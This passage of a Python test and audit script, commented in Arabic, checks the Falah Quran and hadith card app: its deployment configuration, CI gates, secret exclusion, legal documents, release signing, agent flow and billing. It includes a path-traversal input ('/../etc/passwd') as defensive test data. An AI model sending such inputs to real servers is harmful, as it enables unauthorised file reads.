      and "MIN_SURAHS = 114" in _vi)
check("وأنّ الوثيقتين القانونيّتين تُخدَمان من الصورة",
      "/privacy" in _vi and "/terms" in _vi
      and "docs/PRIVACY_POLICY.md" in _dock)
check("وأنّ الخادم يقلع عليها ويُعلن جاهزيّته",
      "/readyz" in _vi and '"ready": true' in _vi and '"content_db": true' in _vi)
# لا يُفحص فهرسُ البحث ضمنًا: جداولُ ممتلئةٌ وفهرسٌ فارغٌ = بحثٌ لا يجد شيئًا
check("وأنّ فهرسَ البحث مبنيٌّ لا الجداولَ وحدها", "ayat_fts" in _vi)
# التعليقُ الذي يذكرها لا يُحسب — يُفحص ما يُنفَّذ لا ما يُشرح. (وقد أسقط
# هذا الفحصَ أوّلَ مرّةٍ تعليقٌ يشرح لماذا لا يُكتب `COPY deploy/`.)
_dock_x = "\n".join(l for l in _dock.splitlines() if not l.lstrip().startswith("#"))
check("ولا يُنسخ مجلّدُ النشر كلُّه — فيه أسرارٌ تبقى في الطبقة",
      "COPY deploy/ deploy/" not in _dock_x and "deploy/backup.sh" in _dock_x)
# طبقاتُ الصورة تُقرأ بـ`docker history`؛ فما لا يدخل السياقَ لا يدخل طبقة
_di = open(os.path.join(os.path.dirname(os.path.abspath(__file__)),
                        ".dockerignore"), encoding="utf-8").read()
check("وسياقُ البناء يمنع الأسرارَ وقواعدَ البيانات",
      all(x in _di for x in ("**/.env", "*.db", "**/*.jks", "falah_app/")))

check("فحص الحاوية يسأل عن الحياة لا عن إحصاء القاعدة",
      "/healthz" in _dock and "http://localhost:8080/health |" not in _dock
      and "/health ||" not in _dock)
check("للعامل فحصُ حياةٍ خاصّ به — المعلَّق لا يبقى «يعمل»",
      "worker.py\", \"--healthcheck" in dep)
check("الخدمتان تقرآن الحدود من ملفّ بيئةٍ واحد",
      dep.count("env_file: [.env]") == 2)
check("النبضة بجوار حالة التطبيق لا في /tmp المتوقَّع",
      '"/tmp' not in open(os.path.join(
          os.path.dirname(os.path.abspath(__file__)), "worker.py")).read())
check("العامل ينبض على القرص داخل حلقته",
      "touch_beat()" in open(os.path.join(
          os.path.dirname(os.path.abspath(__file__)), "worker.py")).read())

# فحصا الحياة والجاهزية مفترقان في المعنى لا في الاسم فقط
_appsrc = open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "app.py")).read()
check("الحياة لا تلمس قاعدةً — رخيصةٌ تُسأل كل ثلاثين ثانية",
      "sqlite3" not in _appsrc.split("def liveness")[1].split("def readiness")[0])
check("الجاهزية تفحص القاعدتين والهجرات والطابور",
      all(x in _appsrc.split("def readiness")[1][:2000]
          for x in ("content_db", "app_db", "pending_migrations", "queue")))
check("وتردّ ٥٠٣ إن لم تكن جاهزة", "200 if ok else 503" in _appsrc)
check("وصمتُ العمّال تحذيرٌ لا إسقاطُ جاهزية — الخادم يستقبل ويضع في الطابور",
      "worker_warning" in _appsrc)

# سعةُ الإصغاء: قياسٌ كشف أن ٤٨ من ١٠٠ اتصالٍ كانت تسقط قبل أن تُقرأ
check("طابور الإصغاء مرفوعٌ عن الافتراضيّ (٥)",
      APP.Server.request_queue_size >= 128, str(APP.Server.request_queue_size))
check("وقابلٌ للضبط من البيئة", "FALAH_LISTEN_BACKLOG" in _appsrc)
check("والخيوط خادمةٌ لا تمنع الإطفاء", APP.Server.daemon_threads is True)


# عقد الـAPI
import api_contract as _AC
_undoc, _stale, _ghost = _AC.audit()
check("لا مسارَ قائمٌ بلا توثيق في العقد", not _undoc, str(_undoc))
check("ولا موثَّقٌ لا وجود له", not _stale, str(_stale))
check("والواجهة لا تنادي مسارًا لا يقدّمه الخادم", not _ghost, str(_ghost))
check("العقد مولَّدٌ من الشيفرة لا مكتوبٌ بجانبها",
      os.path.exists(os.path.join(os.path.dirname(os.path.abspath(__file__)), "API.md")))

# متغيّرات البيئة: كلّ ما تقرؤه الشيفرة موثَّقٌ في القالب
import re as _re2
_root = os.path.dirname(os.path.abspath(__file__))
_used = set()
for _dir, _, _fs in os.walk(_root):
    if any(x in _dir for x in ("raw", "templates", "exports", "out", "__pycache__")): continue
    for _f in _fs:
        if not _f.endswith(".py"): continue
        _t = open(os.path.join(_dir, _f), encoding="utf-8", errors="ignore").read()
        _used |= set(_re2.findall(r'["\'](FALAH_[A-Z_]+)["\']', _t))
_tmpl = open(os.path.join(_root, ".env.example"), encoding="utf-8").read()
_undocumented = sorted(v for v in _used if v not in _tmpl)
check("كل متغيّر بيئةٍ تقرؤه الشيفرة موثَّقٌ في .env.example",
      not _undocumented, str(_undocumented))
# التعريف نفسه الذي يستعمله الفاحص الأمنيّ — لا تعريفان يختلفان
import security_scan as _SS
_leaks = [_l for _l in _tmpl.splitlines()
          if "=" in _l and not _l.startswith("#")
          and _SS.looks_secret(_l.split("=", 1)[1])]
check("ولا قيمةَ سرٍّ حقيقية في القالب — المسارُ مرجعٌ لا سرّ",
      not _leaks, str(_leaks))
check("والقالب يذكر قاعدة المفاتيح لا يكتفي بالأسماء",
      "CREDENTIALS.md" in _tmpl and "App Manager" in _tmpl)

# الاعتماديات: مثبَّتةٌ لا مفتوحة، ومصدرها واحد
import ast as _ast2
_req = open(os.path.join(_root, "requirements.txt"), encoding="utf-8").read()
_pins = _re2.findall(r"^([a-zA-Z0-9_.-]+)==([0-9][0-9.]*)$", _req, _re2.M)
check("كل اعتماديةٍ مثبَّتةٌ بإصدارٍ محدَّد", len(_pins) >= 4, str(_pins))
check("لا اعتماديةَ بحدٍّ مفتوح (>= أو ~=)",
      not _re2.search(r"^[a-zA-Z0-9_.-]+\s*[><~]=", _req, _re2.M))
# ما تستورده الشيفرة فعلًا يجب أن يكون مذكورًا — ولا العكس
_std = set(sys.stdlib_module_names)
_localmods = {f[:-3] for f in os.listdir(_root) if f.endswith(".py")} | {"falah"}
_imported = set()
for _dp, _dirs, _fs in os.walk(_root):
    # `falah_app` مشروعُ Dart: ما فيه من بايثون تولّده أدواتُ Flutter ولا
    # نكتبه — يُستثنى كما استُثني `mobile` للسبب نفسِه. والفاحصُ يسأل عن
    # اعتمادياتِ خادمنا لا عن أدوات سلسلةِ بناءٍ أخرى.
    _dirs[:] = [d for d in _dirs if d not in
                ("raw","templates","exports","out","__pycache__",".git",
                 "mobile","falah_app")]
    for _f in _fs:
        if not _f.endswith(".py"): continue
        try: _tree = _ast2.parse(open(os.path.join(_dp,_f), encoding="utf-8").read())
        except Exception: continue
        for _n in _ast2.walk(_tree):
            if isinstance(_n, _ast2.Import):
                _imported |= {a.name.split(".")[0] for a in _n.names}
            elif isinstance(_n, _ast2.ImportFrom) and _n.module and _n.level == 0:
                _imported.add(_n.module.split(".")[0])
_alias = {"PIL": "pillow", "imageio_ffmpeg": "imageio_ffmpeg"}
_ext = {_alias.get(m, m) for m in _imported - _std - _localmods}
_named = {p[0].lower().replace("-", "_") for p in _pins}
_ghost_dep = sorted(d for d in _ext if d.lower().replace("-", "_") not in _named)
check("كل ما تستورده الشيفرة مذكورٌ في requirements.txt", not _ghost_dep, str(_ghost_dep))
check("الحاوية وخطّ التكامل يثبّتان من الملفّ نفسه لا من سطرٍ مكرَّر",
      "-r requirements.txt" in open(os.path.join(_root, "Dockerfile")).read()
      and "-r requirements.txt" in open(os.path.join(
          _root, ".github", "workflows", "ci.yml")).read())
check("وفحص الثغرات موصوفٌ بنتيجته لا بوعدٍ به",
      "pip-audit" in _req and "make deps" in _req and "صفرًا" in _req)
check("والبوّابة تشمل فحص الاعتماديات",
      "pip-audit" in open(os.path.join(_root, "Makefile")).read()
      and "pip-audit" in open(os.path.join(
          _root, ".github", "workflows", "ci.yml"), encoding="utf-8").read())

# خطّ التكامل: بوّابةٌ لا تُتجاوز
_ci = open(os.path.join(_root, ".github", "workflows", "ci.yml"), encoding="utf-8").read()
# التعليق الذي يذكرها لا يُحسب — يُفحص ما يُنفَّذ لا ما يُشرح
check("لا خطوةَ فحصٍ تُمرَّر على أنها نجاح",
      not [l for l in _ci.splitlines()
           if "continue-on-error" in l and not l.lstrip().startswith("#")])
check("البناء مشروطٌ بنجاح الاختبارات", "needs: [static, tests]" in _ci)
# **الحرفيّةُ مقصودة**: من أضاف وظيفةً إلى الأنبوب أسقط هذا السطرَ حتى
# يضمّها إلى `needs` البوّابة بالاسم. ولولا ذلك لأمكن أن تسقط وظيفةٌ
# ويُدمَج العملُ لأنّ أحدًا لم يشترطها. أُضيف `flutter` يوم بُني العميل.
check("وبوّابةٌ واحدة تُلخّص الكلّ وتُشترط في الحماية",
      "QUALITY_GATE" in _ci and "needs: [static, tests, build, flutter]" in _ci)
for _step in ("ruff check", "mypy", "security_scan.py", "api_contract.py --check",
              "tests.py", "audit.py", "ui_audit.py", "failure_test.py", "docker build",
              # الاختباراتُ التي أُضيفت بعد الأساس — تُشتَرط بالاسم لئلّا
              # تُكتب وتبقى خارج الأنبوب فلا تجري إلا على جهاز كاتبها
              "cors_test.py", "obs_test.py", "sched_test.py", "pub_test.py",
              # وعميلُ Flutter: تحليلٌ واختبارٌ وبناءٌ — لا بناءٌ وحده
              "flutter analyze", "flutter test", "flutter build apk",
              "flutter build appbundle"):
    check(f"خطّ التكامل يشمل: {_step}", _step in _ci)

# صلاحيةُ الإنترنت: عيبٌ وقع فعلًا وكلّف بناءً كاملًا حتى ظهر. فيُحرَس
# في الأنبوب لا في الذاكرة.
check("والأنبوب يتحقّق من صلاحية الإنترنت في نسخة الإصدار",
      "android.permission.INTERNET" in _ci)

# ═══ ما يدخل git وما لا يدخل ═══
# مفتاحُ رفعٍ دخل التاريخَ لا يخرج منه بحذفٍ لاحق — يُبدَّل ولا يُستدرك.
# فالنمطُ يشمل الشجرةَ كلَّها لا مجلّدَ أندرويد وحدَه: كان مقيَّدًا به،
# فمخزنٌ يُنسخ إلى الجذر لحظةَ بناءٍ عَجِلٍ كان يدخل.
_gi2 = open(os.path.join(os.path.dirname(os.path.abspath(__file__)),
                         ".gitignore"), encoding="utf-8").read()
for _pat in ("**/*.jks", "**/*.keystore", "**/key.properties", "**/*.p12",
             "**/service-account*.json", "*.p8", "*.pem"):
    check(f"git يستبعد {_pat}", _pat in _gi2)
# و`docs/` **لا يُستبعد**: فيه السياسةُ والشروطُ اللتان يخدمهما الخادم،
# وأدلّةُ الإطلاق والتوقيع. استبعادُه يُفرغ المستودعَ من نصفِ قيمته.
check("ولا يستبعد docs/",
      not any(l.strip() in ("docs/", "docs") for l in _gi2.splitlines()
              if not l.strip().startswith("#")))
check("وملفّاتُ docs متتبَّعةٌ فعلًا",
      os.path.isdir(os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                 "docs")))

# ═══ الوثائقُ القانونيّة ═══
# المتجران يرفضان التطبيقَ بلا رابطٍ عامٍّ لسياسة الخصوصيّة. والوثيقةُ
# مصدرُها Markdown واحدٌ يُصيَّر صفحةً — فلا نسختان تفترقان.
import falah.legal as _LG
_priv = open(os.path.join(os.path.dirname(os.path.abspath(__file__)),
                          "docs", "PRIVACY_POLICY.md"), encoding="utf-8").read()
_terms = open(os.path.join(os.path.dirname(os.path.abspath(__file__)),
                           "docs", "TERMS_OF_SERVICE.md"), encoding="utf-8").read()
check("سياسةُ الخصوصيّة موجودة", len(_priv) > 3000, str(len(_priv)))
check("وشروطُ الاستخدام موجودة", len(_terms) > 2000, str(len(_terms)))
check("والصفحتان تُصيَّران من الوثيقتين لا من نسختين",
      _LG.page("/privacy")[0] and _LG.page("/terms")[0])
check("والمسارُ المجهولُ لا يُصيَّر", _LG.page("/../etc/passwd")[0] is None)

# السياسةُ تصف ما يجمعه التطبيقُ فعلًا: كلُّ جدولٍ يحمل بيانَ مستخدمٍ
# مذكورٌ فيها بالاسم. جدولٌ يُضاف ولا يُذكر = سياسةٌ صارت كاذبة.
for _t in ("users", "sessions", "projects", "exports", "schedules",
           "publish_accounts", "receipts", "subscriptions", "usage",
           "audit_logs", "tokens", "throttle"):
    check(f"والسياسةُ تذكر جدول {_t}", _t in _priv)
check("وتفصح أنّ سجلَّ التدقيق يبقى بعد الحذف",
      "audit_logs" in _priv and "يبقى" in _priv)
check("وتنفي الذكاءَ الاصطناعيَّ الخارجيَّ صراحةً",
      "ليس نموذجًا لغويًّا" in _priv)
# وهذا النفيُ يُفحص في الشيفرة لا في الوثيقة: وكيلٌ يكتسب نداءً شبكيًّا
# يجعل السياسةَ كذبًا، فيسقط هذا السطرُ قبل أن يُنشر
_agsrc = open(os.path.join(os.path.dirname(os.path.abspath(__file__)),
                           "falah", "agent.py"), encoding="utf-8").read()
check("ولا نداءَ شبكيًّا في الوكيل — النفيُ مفحوصٌ لا مكتوبٌ فقط",
      not any(x in _agsrc for x in ("urllib.request", "http.client", "requests.",
                                    "httpx", "socket.")))
check("وتنفي التتبُّعَ والإعلانات", "لا نبيع بياناتك" in _priv)
check("والشروطُ تنصّ على أنّ النصَّ الشرعيَّ لا يُولَّد",
      "لا يُولَّد" in _terms or "لا يُنشئ فَلاح" in _terms)
check("وتذكر أنّ الاستردادَ يخضع لسياسة المتجر", "الاسترداد" in _terms)

# ⚠ الحقولُ التي يملؤها المالك: يجب أن تختفي قبل الإطلاق. والاختبارُ
# **يُبقيها ظاهرةً في التقرير** ولا يسقط بها — لأنها قرارُ مالكٍ لا عيبُ
# شيفرة. راجع docs/LAUNCH_CHECKLIST.md.
_ph = _priv.count("[يُملأ") + _terms.count("[يُملأ")
check(f"وحقولُ المالك معلَّمةٌ صراحةً لا مخترَعة ({_ph} حقلًا)", _ph > 0)

# ═══ توقيعُ الإصدار: يستحيل أن تخرج نسخةُ إنتاجٍ بمفتاح تصحيح ═══
# هذا أهمُّ ما في ملفّ الـgradle، وأسهلُ ما يُنقض بسطرٍ واحدٍ عند الاستعجال.
_gr = open(os.path.join(os.path.dirname(os.path.abspath(__file__)),
                        "falah_app", "android", "app", "build.gradle.kts"),
           encoding="utf-8").read()
_gr_x = "\n".join(l for l in _gr.splitlines() if not l.lstrip().startswith("//"))
check("لا TODO في إعداد التوقيع", "TODO" not in _gr_x)
check("ونسخةُ الإصدار لا تُسنَد إلى مفتاح التصحيح إسنادًا عامًّا",
      'signingConfig = signingConfigs.getByName("debug")' not in _gr_x,
      "إسنادٌ في buildTypes يسري على المنفذين معًا")
check("ومنفذُ الإنتاج لا يُبنى بلا مفتاحِ رفعٍ — يفشل صراحةً",
      "wantsProductionRelease" in _gr_x and "throw GradleException" in _gr_x)
check("ومنفذُ التجربة معرِّفُه مختلفٌ فلا يُرفع مكانَ الإنتاج",
      'applicationIdSuffix = ".staging"' in _gr_x)
check("واسمُه الظاهرُ يقول إنه تجريبيّ", "تجريبيّ" in _gr)
check("والمخزنُ يُتحقَّق منه قبل البناء لا أثناء التوقيع",
      "ملفُّ المخزن غير موجود" in _gr)
check("والأنبوب يبني منفذَ التجربة بلا أسرار",
      "flutter build apk --flavor staging --release" in _ci)
check("ولا يبني للمتجر إلا بأسرارِ توقيعٍ حاضرة",
      "have_key == 'true'" in _ci and "ANDROID_KEYSTORE_B64" in _ci)
check("ويتحقّق أنّ حزمةَ المتجر موقَّعةٌ فعلًا لا مجرّدَ مبنيّة",
      "META-INF/.*\\.(RSA|EC|DSA)$" in _ci)
check("والمفتاحُ يُمحى بعد الاستعمال ولو فشل البناء",
      "rm -f android/key.properties" in _ci and "if: always()" in _ci)
check("ومفتاحُ الرفع ممنوعٌ من git",
      all(x in open(os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                 "falah_app", "android", ".gitignore"),
                    encoding="utf-8").read()
          for x in ("key.properties", "*.jks", "*.keystore")))

# الخطوات التي أُضيفت في التصليب — تُشترط في CI صراحةً
for _step in ("pip-audit", "leak_test.py", "isolation_test.py", "dbsafe.py restore-test",
              "dbsafe.py migrate-check", "docker run", "healthz", "readyz"):
    check(f"وخطّ التكامل يشمل: {_step}", _step in _ci)
check("ودخانُ الصورة يتحقّق من الملفّات الثابتة فيها",
      "manifest.webmanifest" in _ci and "sw.js" in _ci)
check("وبوّابةٌ واحدة تُشغَّل بأمرٍ واحد محلّيًّا",
      os.path.exists(os.path.join(_root, "gate.py"))
      and "gate.py" in open(os.path.join(_root, "Makefile")).read())
_g = open(os.path.join(_root, "gate.py"), encoding="utf-8").read()
check("والبوّابة تُصنّف المحجوب BLOCKED لا PASS",
      '"BLOCKED"' in _g and "لا يُحسب نجاحًا" in _g)
check("وتطبع سببَ السقوط وأمرَه وملفَّه واقتراحَ إصلاحه",
      all(x in _g for x in ("reason", "command", "file", "fix")))


# وثيقةُ حالة الإطلاق: تُقرأ آليًّا فلا تتقادم صامتة
_st = open(os.path.join(_root, "P0_RELEASE_STATUS.md"), encoding="utf-8").read()
check("وثيقةُ حالة الإطلاق موجودة", bool(_st))
for _sec in ("PROVEN", "BLOCKED", "READY BUT NOT APPLIED", "DEFERRED"):
    check(f"وفيها قسم {_sec}", _sec in _st)
check("ولا تكتب PASS لما لم يُشغَّل",
      "Docker Build" in _st and "BLOCKED" in _st
      and "لم تُبنَ قطّ" in _st)
check("وتقول إن الهجرة ٠٠٣ جاهزةٌ غيرُ مطبَّقة",
      "003_jobs_state_guard" in _st and "غيرُ مطبَّقةٍ على قاعدة الإنتاج" in _st)
check("وتذكر المسار الوحيد المسموح", "make db-safe-migrate" in _st)

check("والأوامر نفسها متاحةٌ محلّيًّا بـmake gate",
      all(x in open(os.path.join(_root, "Makefile")).read()
          for x in ("ruff check", "mypy", "security_scan.py", "tests.py",
                    "audit.py", "ui_audit.py", "failure_test.py", "isolation_test.py")))

print("\n▸ الوكيل")
from falah import agent as AG

def _walk(seed, picks=None):
    """يمشي في الأسئلة سؤالًا سؤالًا كما يفعل المستخدم، ويعيد ما سُئل والإجابات."""
    ans, asked = dict(seed), []
    picks = picks or {}
    for _ in range(40):
        q = AG.next_question(ans, DB, "قناة فلاح")
        if not q: break
        asked.append(q["id"])
        if q["id"] in picks:            ans[q["id"]] = picks[q["id"]]
        elif q["type"] == "auto":       ans[q["id"]] = q["value"] or "—"
        elif q["type"] == "free":       ans[q["id"]] = q.get("default") or "قناة فلاح"
        elif q["type"] == "number":     ans[q["id"]] = str(q.get("default", 1))
        else:                           ans[q["id"]] = q.get("default") or q["options"][0]["value"]
    return asked, ans

_aq, _ansq = _walk({}, {"source_kind": "quran", "surah": "94",
                        "content_type": "post", "platform": "instagram"})
check("فرع القرآن يسأل بالترتيب المطلوب",
      _aq == AG.COMMON_HEAD + AG.QURAN_STEPS + ["design","tint","font","ink"], _aq)
_ah, _ansh = _walk({}, {"source_kind": "hadith", "book": "bukhari",
                        "content_type": "story", "platform": "tiktok"})
check("فرع الحديث يسأل بالترتيب المطلوب",
      _ah == AG.COMMON_HEAD + AG.HADITH_STEPS + AG.COMMON_TAIL, _ah)
check("كل سؤال يحمل سببه",
      all(AG.WHY[k] for k in set(_aq) | set(_ah)))
check("لا تُعرض الأسئلة كلها معًا: سؤالٌ واحدٌ في كل مرّة",
      isinstance(AG.next_question({}, DB), dict) and
      AG.next_question({}, DB)["id"] == "content_type" and
      AG.next_question({}, DB)["index"] == 1)
check("الأبعاد تُختار من نوع المحتوى وحده",
      all(AG.style({"content_type": v})["ratio"] == r for v, _l, r in AG.CONTENT_TYPES) and
      "ratio" not in AG.COMMON_HEAD + AG.QURAN_STEPS + AG.HADITH_STEPS + AG.COMMON_TAIL)
check("العلامة تُقترح من ملف المستخدم وحقلها حرّ",
      AG.next_question({"content_type":"post","platform":"x"}, DB, "قناة فلاح")["default"]
        == "قناة فلاح")
check("درجة الحديث ونصّه يأتيان تلقائيًّا لا اختيارًا",
      all(AG.question(k, _ansh, DB)["type"] == "auto" for k in ("grade", "matn")) and
      AG.question("grade", _ansh, DB)["value"] == _ansh["grade"])
_sq = AG.question("surah", {}, DB)["options"]
check("قائمة السور كاملة ١١٤", len(_sq) == 114, len(_sq))
_c94 = AG.question("from", {"source_kind":"quran","surah":"94"}, DB)["options"]
check("أرقام الآيات تتبع السورة المختارة",
      len(_c94) == AG.surah_info(DB, 94)["n"], len(_c94))
_ch = AG.question("chapter", {"source_kind":"hadith","book":"bukhari"}, DB)["options"]
_hn = AG.question("no", {"source_kind":"hadith","book":"bukhari",
                         "chapter": _ch[0]["value"]}, DB)["options"]
check("الأبواب وأرقام الأحاديث تتبع الكتاب والباب", bool(_ch) and bool(_hn))
check("لا يُعرض بابٌ ولا رقمٌ لم يجتز الفحص",
      all(int(o["value"]) in {h["no"] for h in AG.chapter_hadiths(DB, "bukhari",
          _ch[0]["value"])} for o in _hn))

# ما بُني على إجابةٍ تغيّرت يسقط، فلا يبقى رقمٌ من بابٍ آخر
_dirty = dict(_ansh); _dirty["chapter"] = _ch[-1]["value"]
check("تغيير الباب يُسقط رقم الحديث المبنيّ عليه",
      "no" not in AG.sanitize(_dirty, DB) or
      int(AG.sanitize(_dirty, DB)["no"]) in
        {h["no"] for h in AG.chapter_hadiths(DB, "bukhari", _ch[-1]["value"])})
check("آيةٌ خارج السورة تسقط عند التنظيف",
      "from" not in AG.sanitize({"source_kind":"quran","surah":"94","from":"99"}, DB))
check("تبديل نوع المحتوى الشرعي يمحو فرعه السابق",
      not ({"book","chapter","no"} & set(AG.sanitize(dict(_ansh, source_kind="quran"), DB))))

_plq = AG.plan(dict(_ansq, **{"from":"1","to":"3","count":"3"}), DB)
check("كل بطاقةٍ في الخطة اجتازت الفحوص الخمسة والعشرين",
      _plq["cards"] and all(x["checks"] == "25/25" for x in _plq["cards"]),
      [x["checks"] for x in _plq["cards"]])
check("اختيار عدّةِ آياتٍ يُنتج سلسلةً بطاقةً لكل آية",
      len(_plq["cards"]) == 3, len(_plq["cards"]))
check("الخطة تحمل هيئتها كاملةً كما اختِيرت",
      set(_plq["style"]) == {"ratio","skin","tint","font","ink","watermark",
                             "platform","isnad","tile"}, sorted(_plq["style"]))

_plh = AG.plan(_ansh, DB)
check("خطة الحديث مفحوصةٌ كذلك",
      _plh["cards"] and all(x["checks"] == "25/25" for x in _plh["cards"]))

# السند موجودٌ في البيانات، ويُعرض حين يُطلب لا دائمًا
_hc = _plh["cards"][0]["card"] if _plh["cards"] else None
if _hc:
    _no  = R.build_html(_hc, "hadith", watermark="ق", isnad=False)
    _yes = R.build_html(_hc, "hadith", watermark="ق", isnad=True)
    check("السند لا يُعرض إلا إذا طُلب",
          (_hc.get("isnad_full") or "")[:24] not in _no)
    check("وإذا طُلب عُرض من أول راوٍ لا من وسط السلسلة",
          (_hc.get("isnad_full") or "")[:24] in _yes, (_hc.get("isnad_full") or "")[:30])
    check("والمتن يبقى هو الأبرز مع عرض السند",
          _hc["text"][:30] in _yes and 'class="text"' in _yes)
    _tiled = R.build_html(_hc, "hadith", watermark="ق", tile_mark="فلاح")
    check("العلامة المكرّرة تُرسم خلف النصّ لا فوقه",
          'class="tiles"' in _tiled and "z-index:0" in _tiled
          and _hc["text"][:30] in _tiled)

check("إجاباتٌ ناقصة لا تُسقط الوكيل",
      AG.plan({"source_kind":"hadith"}, DB)["count"] == 0 and
      AG.plan({}, DB)["count"] == 0)

# ما يخرجه الوكيل يجب أن يَقبله المشروع كما هو
_p2 = PJ.create(ac, uid, "من الوكيل")
_ok = 0
for cd in _plq["cards"]:
    try: PJ.add_item(ac, c, uid, _p2, cd["kind"], cd["ref"]); _ok += 1
    except PJ.ProjectError: pass
check("مراجع الوكيل مقبولة في المشروع بلا تعديل", _ok == len(_plq["cards"]), _ok)

# الواجهة: مربّع القالب فوق مربّع الأسئلة، وأزرار التالي والسابق
_ui = open("falah-app.html", encoding="utf-8").read()
check("واجهة التطبيق فيها مربّع قالبٍ ومربّع أسئلةٍ وأزرار تنقّل",
      all(x in _ui for x in ('hold.id = "hold"', 'tpl.id = "tpl"', 'ask.id = "ask"',
                             "السابق", "التالي", 'el("div", "stage")')))
check("البطاقة في الواجهة فيها خانتا العلامتين",
      "العلامة المائية للمستخدم" in _ui and "العلامة المائية للتطبيق" in _ui)
_pv = open("preview_body.html", encoding="utf-8").read()
check("المعاينة تتبع نفس ترتيب الأسئلة",
      all(x in _pv for x in ("COMMON_HEAD", "QURAN_STEPS", "HADITH_STEPS", "COMMON_TAIL")))

# ألوان التصميم والخطوط تغيّر الهيئة لا النصّ
import render as RD
_cardq = _plq["cards"][0]["card"]
_h1 = RD.build_html(_cardq, "quran", skin="parch", tint="green", ink="#111111", font="amiri")
_h2 = RD.build_html(_cardq, "quran", skin="parch")
check("لون التصميم ولون الخط يغيّران الهيئة",
      "#2F5D4A" in _h1 and "#111111" in _h1 and "#2F5D4A" not in _h2)
check("النصّ نفسه لا يتغيّر بتغيّر الهيئة",
      _cardq["text"] in _h1 and _cardq["text"] in _h2)


def _missing(fn):
    """هل يرفض العملُ بلا مفاتيح، ويسمّي المتغيّر الناقص؟"""
    try:
        fn(); return False
    except Exception as e:
        return "غير مضبوط" in str(e) and "CREDENTIALS" in str(e)

def _raises(exc, fn):
    try:
        fn(); return False
    except exc:
        return True
    except Exception:
        return False        # انهيارٌ بنوعٍ آخر ليس ردًّا مقبولًا

def _apple_token_shape():
    import base64, json, os, tempfile
    from cryptography.hazmat.primitives.asymmetric import ec
    from cryptography.hazmat.primitives import serialization
    from falah.stores import apple as AP
    k = ec.generate_private_key(ec.SECP256R1())
    p = tempfile.mktemp(suffix=".p8")
    open(p, "wb").write(k.private_bytes(serialization.Encoding.PEM,
                                        serialization.PrivateFormat.PKCS8,
                                        serialization.NoEncryption()))
    keep = {x: os.environ.get(x) for x in
            ("FALAH_APPLE_KEY_P8", "FALAH_APPLE_KEY_ID",
             "FALAH_APPLE_ISSUER_ID", "FALAH_APPLE_BUNDLE_ID")}
    os.environ.update(FALAH_APPLE_KEY_P8=p, FALAH_APPLE_KEY_ID="K",
                      FALAH_APPLE_ISSUER_ID="I", FALAH_APPLE_BUNDLE_ID="com.falah.app")
    try:
        h, b, sig = AP.token().split(".")
        dec = lambda x: json.loads(base64.urlsafe_b64decode(x + "=" * (-len(x) % 4)))
        raw = base64.urlsafe_b64decode(sig + "=" * (-len(sig) % 4))
        return (dec(h)["alg"] == "ES256" and dec(b)["bid"] == "com.falah.app"
                and len(raw) == 64)
    finally:
        for x, v in keep.items():
            if v is None: os.environ.pop(x, None)
            else:         os.environ[x] = v
        os.remove(p)

print("\n▸ الاشتراك والحصص")
from falah import billing as BL, referrals as RF
import random as _rnd

_m = lambda p: f"{p}{_rnd.randint(10**7,10**8)}@test.falah"
_pw = "Str0ng-Pass!x9"
_ua = AU.register(ac, _m("s"), _pw, "مشترك", "ق")
_e = BL.entitlements(ac, _ua)
check("الحساب الجديد على الخطّة المجانية", _e["plan"] == "free", _e["plan"])
check("للمجاني حصّةٌ معلومة لا مفتوحة",
      _e["limits"]["cards"] > 0 and _e["limits"]["videos"] == 0, str(_e["limits"]))

BL.consume(ac, _ua, "cards", _e["limits"]["cards"])
_msg = ""
try:
    BL.check(ac, _ua, "cards"); check("الحصّة تمنع التجاوز", False)
except BL.BillingError as _ex:
    _msg = str(_ex); check("الحصّة تمنع التجاوز", "حدّ خطّة" in _msg, _msg[:50])
check("الرسالة تقول كيف يُرفع الحدّ", "ارفع خطّتك" in _msg, _msg[:60])

try:
    BL.require(ac, _ua, "ratios", "vertical"); check("المقاس المدفوع ممنوع في المجاني", False)
except BL.BillingError:
    check("المقاس المدفوع ممنوع في المجاني", True)
check("المربّع متاحٌ للمجاني", BL.allows(ac, _ua, "ratios", "square"))
check("خانة فلاح تبقى في المجاني", BL.allows(ac, _ua, "falah_mark"))

BL.grant(ac, _ua, "creator", days=30)
_e2 = BL.entitlements(ac, _ua)
check("الترقية تفتح الحصّة والمقاسات",
      _e2["plan"] == "creator" and _e2["left"]["cards"] > 0
      and BL.allows(ac, _ua, "ratios", "vertical"), str(_e2["left"]))
check("ولك رفع خانة فلاح في المدفوع", not BL.allows(ac, _ua, "falah_mark"))

# الترقية لا تمسّ الفحص ولا النسبة — هذا هو الشرط الحاكم
import render as _RD
_c2 = _plq["cards"][0]["card"]
_free = _RD.build_html(_c2, "quran", falah_mark=True,  watermark="قناتي")
_paid = _RD.build_html(_c2, "quran", falah_mark=False, watermark="قناتي")
check("خانة فلاح وحدها هي ما يُرفع بالاشتراك",
      "FALAH" in _free and "FALAH" not in _paid)
# ما يظهر على وجه البطاقة من نسبة: اسم المفسّر واسم المترجم وخانات الموضع
_c3 = _RD.build_html.__self__ if False else None
import sqlite3 as _sq
_cc = _sq.connect("file:falah.db?mode=ro", uri=True); _cc.row_factory = _sq.Row
_att, _ = api.quran_card(_cc, 94, 1, None, True, True); _cc.close()
_f2 = _RD.build_html(_att, "quran", falah_mark=True,  watermark="قناتي")
_p2 = _RD.build_html(_att, "quran", falah_mark=False, watermark="قناتي")
_names = [_att["tafsir"]["source"], _att["translation"]["source"],
          _att["cells"]["c1"][0], _att["cells"]["c4"][0]]
check("نسبة النصّ إلى مصدره ثابتةٌ في الخطّتين",
      all(n in _f2 and n in _p2 for n in _names) and
      _att["text"] in _f2 and _att["text"] in _p2, str(_names))
check("علامة المستخدم تبقى في الخطّتين", "قناتي" in _f2 and "قناتي" in _p2)
check("لا خطّةَ تُرخي فحصًا",
      all("checks" not in p["features"] and "verify" not in p["features"]
          for p in BL.PLANS.values()))

# حمولةٌ من جهازٍ بلا تحقّقٍ من المتجر لا تُمنح شيئًا — ولو كانت تامّة الشكل
_before = BL.entitlements(ac, _ua)["plan"]
try:
    BL.apply_store_event(ac, _ua, "apple",
        {"type": "purchase", "product_id": "com.falah.studio.year",
         "transaction_id": "FORGED-1"})
    check("حمولةٌ غير محقَّقة لا تمنح اشتراكًا", False)
except BL.BillingError as _ex:
    check("حمولةٌ غير محقَّقة لا تمنح اشتراكًا",
          BL.entitlements(ac, _ua)["plan"] == _before, str(_ex)[:50])
